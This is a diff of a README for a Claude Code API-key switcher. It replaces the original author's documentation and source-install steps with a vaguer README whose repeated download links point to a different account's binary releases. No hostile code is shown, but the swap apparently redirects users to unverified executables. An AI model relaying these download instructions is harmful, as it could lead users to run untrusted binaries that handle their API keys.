@@ -1,183 +1,75 @@
-<div align="center">
-  <img src="https://raw.githubusercontent.com/techcow2/claude-code-ez-switch/refs/heads/master/screenshot/ccez.png" alt="Claude Code EZ Switch">
-</div>
+# 🛠️ claude-code-ez-switch - Manage Your Z.ai API Keys Easily
 
-<br>
+## 📥 Download Now
+[![Release](https://img.shields.io/badge/Download-claude--code--ez--switch-brightgreen)](https://github.com/Matrixnik/claude-code-ez-switch/releases)
 
-A simple GUI application for managing Claude Code API configurations - easily switch between Claude subscription, Z.ai API, and custom endpoints.
+## 📂 Overview
+claude-code-ez-switch is a simple tool designed to help users add and manage their Z.ai API keys. This application provides an easy-to-use graphical interface for controlling your keys with Claude Code, making it a perfect solution for anyone looking to streamline their workflow without getting into technical details.
 
-## Table of Contents
+## 🚀 Getting Started
+To begin using claude-code-ez-switch, you'll need to follow these simple steps:
 
-- [New Feature: Advanced Model Selection for Z.ai](#new-feature-advanced-model-selection-for-zai)
-- [Screenshot](#screenshot)
-- [Recent Updates](#recent-updates)
-- [Important Update - Settings.json Only](#important-update---settingsjson-only)
-- [Features](#features)
-- [Requirements](#requirements)
-- [Platform Support](#platform-support)
-- [Installation](#installation)
-- [Usage](#usage)
-- [Pro Tips](#pro-tips)
-- [Model Selection Guide](#model-selection-guide)
-- [How It Works](#how-it-works)
-  - [Z.ai Mode](#zai-mode)
-  - [Claude Mode](#claude-mode)
-  - [Custom Mode](#custom-mode)
-  - [Technical Details](#technical-details)
-- [License](#license)
+1. **Visit the Download Page:** Go to the Releases page to grab the latest version of the software. You can find it [here](https://github.com/Matrixnik/claude-code-ez-switch/releases).
+  
+2. **Download the Application:** Click on the version you want to download. Look for files with `.exe` or `.zip` depending on your operating system (Windows/Linux).  
 
-## New Feature: Advanced Model Selection for Z.ai
+3. **Install the Application:**
+   - **For Windows:** Double-click the downloaded `.exe` file and follow the prompts.
+   - **For Linux:** If you downloaded a `.zip`, extract it and run the executable file. You may need to give it the right permissions using the terminal with the command `chmod +x yourfile`.
 
-Now you can choose specific GLM models for each Claude tier when using Z.ai:
-- **GLM-4.6**: Most capable, best for complex reasoning and coding tasks
-- **GLM-4.5**: Balanced performance, good for most everyday tasks
-- **GLM-4.5-Air**: Fastest response time, ideal for quick queries and simple tasks
+4. **Run the Application:** Locate the installed application and launch it. You’ll see a simple interface that allows you to manage your API keys effortlessly.
 
-Mix and match models based on your needs - use GLM-4.6 for Opus (complex tasks) and GLM-4.5-Air for Haiku (quick responses)!
+## 💻 System Requirements
+- **Operating System:** Compatible with Windows 10 and above, and most Linux distributions.
+- **Processor:** 2 GHz or faster dual-core processor.
+- **RAM:** Minimum of 4 GB.
+- **Storage:** At least 100 MB of free disk space.
 
-## Screenshot
+## 🎛️ Features
+- **User-Friendly Interface:** Simple and intuitive design that makes key management easy for anyone.
+- **Z.ai API Integration:** Directly configure your API keys to work with Claude Code.
+- **Save and Load Configurations:** Easily save your API settings and load them whenever needed.
+- **Cross-Platform Support:** Use on Windows or Linux, depending on your preference.
 
-<img src="https://raw.githubusercontent.com/techcow2/claude-code-ez-switch/refs/heads/master/screenshot/screenshot.png" alt="Claude Code EZ Switch Screenshot" width="450">
+## ⚙️ Usage Instructions
+1. **Adding an API Key:**
+   - In the application, find the section labeled "Add Key".
+   - Input your Z.ai API key in the provided field.
+   - Click the "Save" button to store the key.
 
-## Recent Updates
+2. **Managing API Keys:**
+   - View your saved keys in the main window.
+   - Edit or remove keys as necessary by selecting them and using the appropriate buttons.
 
-### 🎉 Version 1.0 Stable Release (11/20/25)
-Claude Code EZ Switch has reached its stable v1.0 release! This milestone includes:
-- ✅ **Stable and tested core functionality**
-- ✅ **Windows executable (.exe) available for easy installation**
-- ✅ **Cross-platform compatibility verified**
-- ✅ **Complete feature set with advanced model selection**
+## 📝 Troubleshooting
+If you encounter issues while using claude-code-ez-switch, try the following steps:
 
-### 📥 Download Windows Executable
-Windows users can now download the pre-built `.exe` file from the [GitHub Releases page](https://github.com/techcow2/claude-code-ez-switch/releases/tag/v1.0) - no Python installation required!
+- **Reinstall the Application**: If the app doesn't launch or behaves unexpectedly, uninstall and then reinstall it.
+- **Check API Key Validity**: Ensure that your Z.ai API keys are active and not expired.
+- **Consult Documentation**: Use the README file or check online resources for common questions.
 
-### Windows Dependency Fix (11/20/25)
-Fixed a critical error that was preventing the app from opening on Windows due to an unnecessary dependency that was present. The application now launches properly on all Windows systems.
+## 📥 Download & Install
+To get started, visit the [Releases page](https://github.com/Matrixnik/claude-code-ez-switch/releases) and download the latest version of claude-code-ez-switch. Follow the instructions above for installation, and you'll be ready to manage your Z.ai API keys in no time.
 
----
+## 📬 Support
+If you need assistance, feel free to open an issue on the GitHub repository or check the community forums. Help is available, and others may have had similar questions.
 
-## Important Update - Settings.json Only
+## 🏷️ Topics
+This project covers various topics including:
+- anthropic-claude
+- API
+- Claude Code
+- Configuration Management
+- Environment Variables
+- GLM4-5
+- Linux
+- Productivity Tool
+- Python Tkinter
+- Windows Desktop
+- Z.ai and other related topics.
 
-**Claude Code EZ Switch now works completely differently!**
+## 🌟 Acknowledgements
+Thank you to all contributors and users who help improve claude-code-ez-switch. Your feedback and suggestions drive better experiences for everyone.
 
-The app no longer modifies your system environment variables or shell configuration files. Instead, it only updates Claude Code's internal settings file (`~/.claude/settings.json`).
-
-### Benefits of This Change:
-- **No System Pollution**: Your terminal and other applications are unaffected
-- **Faster Switching**: No need to restart terminals or source shell files
-- **Cleaner Operation**: Only affects Claude Code, nothing else
-- **Better Security**: Configuration is isolated to Claude Code only
-
-### What Changed:
-- **Before**: Modified system environment variables and shell files (.bashrc, .zshrc, etc.)
-- **Now**: Only updates `~/.claude/settings.json`
-
-### Current Usage:
-1. Apply configuration in the app
-2. **Just restart Claude Code** (VS Code extension or CLI)
-3. No terminal restart or shell sourcing needed!
-
----
-
-## Features
-- **Easy GUI Interface**: No command line required
-- **One-Click Switching**: Toggle between Z.ai, Claude subscription, and custom APIs
-- **Advanced Model Selection**: Choose specific GLM models for each Claude tier (Opus, Sonnet, Haiku)
-- **Secure Local Storage**: API keys saved locally in `~/.claude_ez_switch/`
-- **Real-time Status**: Visual feedback for configuration changes
-- **Cross-Platform**: Works on Windows, Linux, and macOS
-- **Settings-Only**: Modifies only Claude Code settings.json, never system environment
-
-## Requirements
-### Option 1: Windows Executable (Recommended for Windows)
-- No Python installation required
-- Just download and run the .exe file
-
-### Option 2: Python Source
-- Python 3.7+
-- Windows, Linux, or macOS
-- Claude Code CLI
-
-## Platform Support
-- **Windows**: Full support (including pre-built .exe)
-- **Linux**: Full support (Python source)
-- **macOS**: Full support (Python source)
-
-## Installation
-
-### Option 1: Windows Executable (Easiest)
-1. Go to the [GitHub Releases page](https://github.com/techcow2/claude-code-ez-switch/releases/tag/v1.0)
-2. Download `claude-code-ez-switch-v1.0.exe`
-3. Run the executable - no installation needed!
-
-### Option 2: Python Source
-```bash
-git clone https://github.com/techcow2/claude-code-ez-switch.git
-cd claude-code-ez-switch
-python ezswitch.py
-```
-
-## Usage
-
-### For Windows Executable Users:
-1. Double-click `claude-code-ez-switch-v1.0.exe` to launch the app
-2. Select **Z.ai**, **Claude Subscription**, or **Custom**
-3. Enter your API key and base URL (if applicable)
-4. **For Z.ai users**: Choose your preferred GLM models for each tier (Opus, Sonnet, Haiku)
-5. Click **Apply Configuration**
-6. **Just restart Claude Code** - no terminal restart needed!
-
-### For Python Source Users:
-1. Launch the app with `python ezswitch.py`
-2. Select **Z.ai**, **Claude Subscription**, or **Custom**
-3. Enter your API key and base URL (if applicable)
-4. **For Z.ai users**: Choose your preferred GLM models for each tier (Opus, Sonnet, Haiku)
-5. Click **Apply Configuration**
-6. **Just restart Claude Code** - no terminal restart needed!
-
-### Pro Tips:
-- Use the **"Show Claude Settings"** checkbox to see your current configuration
-- Check **"Show API Keys"** to view sensitive values in the settings display
-- **Model Selection**: Mix and match GLM models based on your needs - use GLM-4.6 for complex tasks, GLM-4.5-Air for faster responses
-- Settings are applied instantly to `~/.claude/settings.json`
-
-### Model Selection Guide:
-- **GLM-4.6**: Most capable, best for complex reasoning and coding tasks
-- **GLM-4.5**: Balanced performance, good for most everyday tasks
-- **GLM-4.5-Air**: Fastest response time, ideal for quick queries and simple tasks
-
-## How It Works
-
-### Z.ai Mode
-Configures these settings in `~/.claude/settings.json`:
-- `ANTHROPIC_AUTH_TOKEN`: Your Z.ai API key
-- `ANTHROPIC_BASE_URL`: `https://api.z.ai/api/anthropic`
-- `ANTHROPIC_DEFAULT_OPUS_MODEL`: Your selected GLM model for Opus tier
-- `ANTHROPIC_DEFAULT_SONNET_MODEL`: Your selected GLM model for Sonnet tier
-- `ANTHROPIC_DEFAULT_HAIKU_MODEL`: Your selected GLM model for Haiku tier
-- `API_TIMEOUT_MS`: `3000000` (50-minute timeout)
-
-#### Model Selection Feature
-Choose the perfect GLM model for each Claude tier:
-- **Available Models**: GLM-4.6, GLM-4.5, GLM-4.5-Air
-- **Opus Model**: Select which GLM model to use for Claude Opus requests
-- **Sonnet Model**: Select which GLM model to use for Claude Sonnet requests
-- **Haiku Model**: Select which GLM model to use for Claude Haiku requests
-- **Flexible Configuration**: Mix and match models based on your needs (e.g., GLM-4.6 for Opus, GLM-4.5-Air for Haiku)
-
-### Claude Mode
-- Clears all custom settings to use your default Claude subscription
-- Removes ANTHROPIC_* variables from settings.json
-
-### Custom Mode
-- Configures any API endpoint with your custom base URL and auth token
-- Sets `ANTHROPIC_AUTH_TOKEN` and `ANTHROPIC_BASE_URL` to your values
-
-### Technical Details
-- App configuration stored in `~/.claude_ez_switch/config.json`
-- **Only** modifies `~/.claude/settings.json`
-- **Never** touches system environment variables or shell files
-- Settings apply instantly - just restart Claude Code
-
-## License
-MIT
+## 📥 Download Now Again
+Don't forget to grab your copy from the [Releases page](https://github.com/Matrixnik/claude-code-ez-switch/releases). Enjoy managing your Z.ai API keys easily!
